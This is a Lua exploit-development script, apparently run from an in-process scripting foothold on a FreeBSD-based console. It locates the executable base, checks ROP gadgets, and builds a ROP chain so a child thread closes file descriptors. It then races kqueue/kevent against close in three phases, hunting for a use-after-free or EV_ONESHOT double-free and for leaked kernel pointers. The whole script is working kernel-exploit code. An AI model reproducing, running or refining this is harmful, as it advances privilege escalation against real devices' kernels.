-- CRASH_CLASS: HIGH
-- PROBE 271h: kqueue race with data-bearing sockets
--
-- 271g confirmed child thread close via ROP. But 200 empty-socket races
-- produced 0 events — kevent sleeping finds nothing to race with.
-- This probe uses socketpair + write to make events ACTIVE, then
-- tight-loops kevent while the child closes the monitored fd.
-- The race window: kevent processing active knotes vs knote_fdclose.
--
-- Also tries: EV_ONESHOT (auto-delete after return → double-free potential),
-- and closing the KQUEUE fd from child while main thread is in kevent.

print("=== PROBE 271h: kqueue race with data ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Syscall helpers
local sc_socket = mk(97)
local sc_close = mk(6)
local sc_thr_new = mk(455)
local sc_kqueue = mk(362)
local sc_kevent = mk(363)
local sc_socketpair = mk(135)  -- socketpair(domain, type, proto, sv)
local sc_write = mk(4)

-- [A] Eboot base + gadgets (reuse 271g's findings)
print("[A] eboot + gadgets")
local info = memory.alloc(0x200)
wd(N(info), 0x160)
local sc593 = mk(593)
pcall(function() sc593(uint64(0), info) end)
local eboot_lo = rd(N(info) + 0x108)
local eboot_hi = rd(N(info) + 0x10C)
if not eboot_lo or not eboot_hi then print("ABORT: no eboot"); return end
local eboot_base = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo))
print("eboot=" .. fmt_addr(eboot_base))

-- 271g found: pop_rax_ret at +0x992, pop_rdi_rbp_ret at +0x169, bare_ret at +0x42
local g_pop_rax_ret = eboot_base + 0x992
local g_pop_rdi_rbp_ret = eboot_base + 0x169
local g_bare_ret = eboot_base + 0x42

-- Verify pop_rax_ret bytes
local vb = rd(N(eboot_base) + 0x992)
if vb then
    local b0 = vb % 256
    local b1 = math.floor(vb / 256) % 256
    if b0 ~= 0x58 or b1 ~= 0xC3 then
        print("ABORT: pop_rax_ret mismatch at new ASLR base")
        return
    end
end
print("gadgets verified")

-- [B] Set up ROP chain helpers
local stack_mem = memory.alloc(0x8000)
local stack_base = N(stack_mem)
local stack_size = 0x4000
local rsp = stack_base + stack_size - 8

local param = memory.alloc(0x40)
local pa = N(param)
for i = 0, 0x3C, 4 do wd(pa + i, 0) end
wq(pa + 0x00, g_bare_ret)
wq(pa + 0x10, uint64(stack_base))
wq(pa + 0x18, uint64(stack_size))
local child_tid = memory.alloc(8)
wq(pa + 0x30, child_tid)

local function spawn_close(fd_val)
    -- ROP: pop_rax(6) → fn_addr(close(rdi=fd)) → pop_rdi_rbp(0,0) → pop_rax(431) → fn_addr(thr_exit(0))
    wq(rsp,      g_pop_rax_ret)
    wq(rsp + 8,  uint64(6))
    wq(rsp + 16, stub)
    wq(rsp + 24, g_pop_rdi_rbp_ret)
    wq(rsp + 32, uint64(0))     -- rdi = 0 for thr_exit
    wq(rsp + 40, uint64(0))     -- dummy rbp
    wq(rsp + 48, g_pop_rax_ret)
    wq(rsp + 56, uint64(431))   -- SYS_thr_exit
    wq(rsp + 64, stub)

    wq(pa + 0x08, uint64(fd_val))
    wq(N(child_tid), uint64(0))
    local ok, rv = pcall(function() return sc_thr_new(param, uint64(0x38)) end)
    return ok and N(rv) == 0
end

-- [C] Phase 1: data-bearing kqueue race (socketpair + write + kevent loop)
print("")
print("[C] socketpair + data race (100 outer × 50 inner)")

local ok_kq, kq_rv = pcall(function() return sc_kqueue() end)
local kq_fd = ok_kq and N(kq_rv) or -1
print("kqueue fd=" .. kq_fd)
if kq_fd < 0 then print("ABORT: no kqueue"); return end

local changelist = memory.alloc(0x40)
local eventlist = memory.alloc(0x200)
local timeout = memory.alloc(0x10)
local ca = N(changelist)
local ea = N(eventlist)
local ta = N(timeout)

-- Zero timeout for non-blocking kevent
wq(ta, uint64(0))
wq(ta + 8, uint64(0))

local data_buf = memory.alloc(16)
wd(N(data_buf), 0x41424344)  -- "ABCD"

local sv = memory.alloc(8)
local races = 0
local anomalies = 0
local events_total = 0
local ev_errors = 0

for iter = 1, 100 do
    if not alive() then print("DEAD at iter " .. iter); break end

    -- Create socketpair
    for i = 0, 4, 4 do wd(N(sv) + i, 0xFFFFFFFF) end
    local ok_sp, sp_rv = pcall(function()
        return sc_socketpair(uint64(1), uint64(2), uint64(0), sv)  -- AF_UNIX, SOCK_DGRAM
    end)
    local sp_ret = ok_sp and N(sp_rv) or -1
    if sp_ret ~= 0 then
        print("iter " .. iter .. ": socketpair failed (ret=" .. sp_ret .. ")")
        break
    end
    local fd0 = rd(N(sv))      -- sender
    local fd1 = rd(N(sv) + 4)  -- receiver (monitored)
    if not fd0 or not fd1 or fd0 < 0 or fd1 < 0 then
        print("iter " .. iter .. ": bad fds")
        break
    end

    -- Register EVFILT_READ on fd1
    wq(ca, uint64(fd1))
    wd(ca + 8, 0x0001FFFF)  -- filter=-1(EVFILT_READ), flags=EV_ADD
    wd(ca + 12, 0)
    wq(ca + 16, uint64(0))
    wq(ca + 24, uint64(0xBEEF0000 + iter))
    pcall(function()
        sc_kevent(uint64(kq_fd), changelist, uint64(1), uint64(0), uint64(0), uint64(0))
    end)

    -- Write data to fd0 → fd1 becomes readable
    pcall(function() sc_write(uint64(fd0), data_buf, uint64(4)) end)

    -- Spawn child to close fd1
    spawn_close(fd1)

    -- Tight kevent loop — race close against event processing
    for j = 1, 50 do
        for off = 0, 0xFC, 4 do wd(ea + off, 0xDEAD0000) end

        local ok_ev, ev_rv = pcall(function()
            return sc_kevent(uint64(kq_fd), uint64(0), uint64(0), eventlist, uint64(4), timeout)
        end)
        local nev = ok_ev and N(ev_rv) or -999

        if nev > 0 then
            events_total = events_total + nev
            for ei = 0, nev - 1 do
                local bo = ei * 32
                local id_lo = rd(ea + bo) or 0
                local id_hi = rd(ea + bo + 4) or 0
                local fl = rd(ea + bo + 8) or 0
                local dt_lo = rd(ea + bo + 16) or 0
                local dt_hi = rd(ea + bo + 20) or 0
                local ud_lo = rd(ea + bo + 24) or 0
                local ud_hi = rd(ea + bo + 28) or 0

                -- Check flags for EV_ERROR (0x4000)
                local flags_hi = math.floor(fl / 65536) % 65536
                if flags_hi >= 0x4000 then
                    ev_errors = ev_errors + 1
                end

                -- Kernel pointer checks
                local function ckptr(name, hi, lo)
                    local uhi = hi; if uhi < 0 then uhi = uhi + 0x100000000 end
                    if uhi >= 0xFFFF8000 and uhi < 0xFFFFFFFF then
                        anomalies = anomalies + 1
                        print(string.format("*** KPTR iter=%d j=%d %s=0x%08X%08X ***",
                            iter, j, name, hi, lo))
                        return true
                    end
                    return false
                end
                local any = ckptr("ident", id_hi, id_lo)
                any = ckptr("data", dt_hi, dt_lo) or any
                any = ckptr("udata", ud_hi, ud_lo) or any

                -- Stale ident check
                if id_hi == 0 and id_lo ~= fd1 and id_lo ~= 0 then
                    anomalies = anomalies + 1
                    any = true
                    print(string.format("*** STALE iter=%d j=%d ident=%d expected=%d ***",
                        iter, j, id_lo, fd1))
                end

                -- Unexpected udata (not our sentinel)
                local expected_ud = 0xBEEF0000 + iter
                local actual_ud_lo = ud_lo; if actual_ud_lo < 0 then actual_ud_lo = actual_ud_lo + 0x100000000 end
                if ud_hi ~= 0 or actual_ud_lo ~= expected_ud then
                    if ud_lo ~= 0 and not any then  -- skip zero (might be valid)
                        anomalies = anomalies + 1
                        any = true
                        print(string.format("*** UDATA iter=%d j=%d got=0x%08X%08X exp=0x%08X ***",
                            iter, j, ud_hi, ud_lo, expected_ud))
                    end
                end

                if any then
                    print(string.format("  dump: id=%08X%08X fl=%08X dt=%08X%08X ud=%08X%08X",
                        id_hi, id_lo, fl, dt_hi, dt_lo, ud_hi, ud_lo))
                end
            end
        elseif nev == -999 then
            anomalies = anomalies + 1
        end

        races = races + 1
    end

    -- Wait for child, close remaining fds
    for w = 1, 300 do local _ = rd(stack_base) end
    pcall(function() sc_close(uint64(fd0)) end)
    pcall(function() sc_close(uint64(fd1)) end)

    if iter % 25 == 0 then
        print(string.format("  C: iter=%d races=%d ev=%d err=%d anom=%d",
            iter, races, events_total, ev_errors, anomalies))
    end
end

if not alive() then print("DEAD after phase C"); return end

-- [D] Phase 2: EV_ONESHOT variant — auto-delete races with close
print("")
print("[D] EV_ONESHOT race (100 outer × 50 inner)")

local races2 = 0
local anom2 = 0
local ev2 = 0

for iter = 1, 100 do
    if not alive() then print("DEAD at iter " .. iter); break end

    for i = 0, 4, 4 do wd(N(sv) + i, 0xFFFFFFFF) end
    local ok_sp, sp_rv = pcall(function()
        return sc_socketpair(uint64(1), uint64(2), uint64(0), sv)
    end)
    if (ok_sp and N(sp_rv) or -1) ~= 0 then break end
    local fd0 = rd(N(sv))
    local fd1 = rd(N(sv) + 4)
    if not fd0 or not fd1 then break end

    -- Register with EV_ADD | EV_ONESHOT (0x0001 | 0x0010 = 0x0011)
    wq(ca, uint64(fd1))
    wd(ca + 8, 0x0011FFFF)  -- filter=-1, flags=EV_ADD|EV_ONESHOT
    wd(ca + 12, 0)
    wq(ca + 16, uint64(0))
    wq(ca + 24, uint64(0xCAFE0000 + iter))
    pcall(function()
        sc_kevent(uint64(kq_fd), changelist, uint64(1), uint64(0), uint64(0), uint64(0))
    end)

    pcall(function() sc_write(uint64(fd0), data_buf, uint64(4)) end)
    spawn_close(fd1)

    for j = 1, 50 do
        for off = 0, 0xFC, 4 do wd(ea + off, 0xDEAD0000) end

        local ok_ev, ev_rv = pcall(function()
            return sc_kevent(uint64(kq_fd), uint64(0), uint64(0), eventlist, uint64(4), timeout)
        end)
        local nev = ok_ev and N(ev_rv) or -999

        if nev > 0 then
            ev2 = ev2 + nev
            for ei = 0, nev - 1 do
                local bo = ei * 32
                local id_hi = rd(ea + bo + 4) or 0
                local id_lo = rd(ea + bo) or 0
                local dt_hi = rd(ea + bo + 20) or 0
                local ud_hi = rd(ea + bo + 28) or 0

                local uhi = id_hi; if uhi < 0 then uhi = uhi + 0x100000000 end
                if uhi >= 0xFFFF8000 and uhi < 0xFFFFFFFF then
                    anom2 = anom2 + 1
                    print(string.format("*** D-KPTR iter=%d j=%d ident=0x%08X%08X ***",
                        iter, j, id_hi, id_lo))
                end
                local dhi = dt_hi; if dhi < 0 then dhi = dhi + 0x100000000 end
                if dhi >= 0xFFFF8000 and dhi < 0xFFFFFFFF then
                    anom2 = anom2 + 1
                    print(string.format("*** D-KPTR iter=%d j=%d data=0x%08X%08X ***",
                        iter, j, dt_hi, rd(ea + bo + 16) or 0))
                end
            end
        elseif nev == -999 then
            anom2 = anom2 + 1
        end
        races2 = races2 + 1
    end

    for w = 1, 300 do local _ = rd(stack_base) end
    pcall(function() sc_close(uint64(fd0)) end)
    pcall(function() sc_close(uint64(fd1)) end)

    if iter % 25 == 0 then
        print(string.format("  D: iter=%d races=%d ev=%d anom=%d",
            iter, races2, ev2, anom2))
    end
end

if not alive() then print("DEAD after phase D"); return end

-- [E] Phase 3: close the KQUEUE fd from child while main is in kevent
print("")
print("[E] close-kqueue race (50 iterations)")

local races3 = 0
local anom3 = 0

for iter = 1, 50 do
    if not alive() then print("DEAD at iter " .. iter); break end

    local ok_kq2, kq2 = pcall(function() return sc_kqueue() end)
    local kq2_fd = ok_kq2 and N(kq2) or -1
    if kq2_fd < 0 then break end

    -- Register something in this kqueue
    local ok_sk2, sk2 = pcall(function()
        return sc_socket(uint64(2), uint64(2), uint64(0))
    end)
    local s2 = ok_sk2 and N(sk2) or -1
    if s2 < 0 then
        pcall(function() sc_close(uint64(kq2_fd)) end)
        break
    end

    wq(ca, uint64(s2))
    wd(ca + 8, 0x0001FFFF)
    wd(ca + 12, 0)
    wq(ca + 16, uint64(0))
    wq(ca + 24, uint64(0))
    pcall(function()
        sc_kevent(uint64(kq2_fd), changelist, uint64(1), uint64(0), uint64(0), uint64(0))
    end)

    -- Spawn child to close the KQUEUE fd (not the socket)
    spawn_close(kq2_fd)

    -- Main: kevent with 10ms timeout (will block, child closes kq underneath)
    wq(ta, uint64(0))
    wq(ta + 8, uint64(10000000))  -- 10ms

    for off = 0, 0xFC, 4 do wd(ea + off, 0xDEAD0000) end

    local ok_ev3, ev3 = pcall(function()
        return sc_kevent(uint64(kq2_fd), uint64(0), uint64(0), eventlist, uint64(4), timeout)
    end)
    local nev3 = ok_ev3 and N(ev3) or -999
    races3 = races3 + 1

    if nev3 == -999 then
        anom3 = anom3 + 1
    elseif nev3 > 0 then
        -- Scan for kernel pointers in returned events
        for ei = 0, nev3 - 1 do
            local bo = ei * 32
            local id_hi = rd(ea + bo + 4) or 0
            local uhi = id_hi; if uhi < 0 then uhi = uhi + 0x100000000 end
            if uhi >= 0xFFFF8000 and uhi < 0xFFFFFFFF then
                anom3 = anom3 + 1
                local id_lo = rd(ea + bo) or 0
                print(string.format("*** E-KPTR iter=%d ident=0x%08X%08X ***", iter, id_hi, id_lo))
            end
        end
    end

    for w = 1, 300 do local _ = rd(stack_base) end
    pcall(function() sc_close(uint64(s2)) end)
    pcall(function() sc_close(uint64(kq2_fd)) end)

    if iter % 25 == 0 then
        print(string.format("  E: iter=%d races=%d anom=%d", iter, races3, anom3))
    end
end

print("")
print("=== SUMMARY ===")
print(string.format("Phase C (data race):     races=%d events=%d ev_err=%d anom=%d",
    races, events_total, ev_errors, anomalies))
print(string.format("Phase D (EV_ONESHOT):    races=%d events=%d anom=%d",
    races2, ev2, anom2))
print(string.format("Phase E (close kqueue):  races=%d anom=%d", races3, anom3))
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 271h COMPLETE ===")
